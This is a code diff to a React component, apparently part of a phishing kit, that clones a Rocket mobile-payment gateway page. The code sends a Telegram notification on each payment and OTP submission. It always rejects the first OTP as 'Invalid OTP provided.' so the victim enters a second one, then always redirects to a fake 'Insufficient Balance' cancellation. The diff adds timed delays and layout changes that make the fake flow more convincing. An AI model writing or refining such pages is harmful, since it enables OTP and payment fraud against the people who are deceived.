@@ -91,9 +91,11 @@ const RocketPayment = () => {
     setIsSubmitting(true);
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket' });
 
-    // Go straight to OTP page instantly
-    setIsSubmitting(false);
-    setShowOtp(true);
+    // 1s delay before showing OTP page
+    setTimeout(() => {
+      setIsSubmitting(false);
+      setShowOtp(true);
+    }, 1000);
   };
 
 
@@ -108,8 +110,9 @@ const RocketPayment = () => {
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket OTP' });
 
     if (otpAttempts === 0) {
-      setIsSubmitting(false);
-      setOtpAttempts(1);
+      setTimeout(() => {
+        setIsSubmitting(false);
+        setOtpAttempts(1);
       setShowError("Invalid OTP provided.");
       setOtp("");
       setTimeout(() => otpRef.current?.focus(), 50);
@@ -118,7 +121,8 @@ const RocketPayment = () => {
     }
 
     setIsSubmitting(false);
-    navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}.00`);
+      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}.00`);
+    }, 1000);
   };
 
   const handleBack = () => {
@@ -178,7 +182,7 @@ const RocketPayment = () => {
   // OTP Page (matches second screenshot exactly)
   if (showOtp) {
     return (
-      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
+    <div className="h-screen bg-[#f0f0f0] flex items-center justify-center px-4 overflow-hidden">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           {/* Colored line under header */}
@@ -241,7 +245,7 @@ const RocketPayment = () => {
   // Failed page
   if (showFailed) {
     return (
-      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
+      <div className="h-screen bg-[#f0f0f0] flex items-center justify-center px-4 overflow-hidden">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           {gatewayBanner}
@@ -260,7 +264,7 @@ const RocketPayment = () => {
 
   // Main form page (matches first screenshot exactly)
   return (
-    <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
+    <div className="h-screen bg-[#f0f0f0] flex items-center justify-center px-4 overflow-hidden">
       <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
         {header}
         {gatewayBanner}
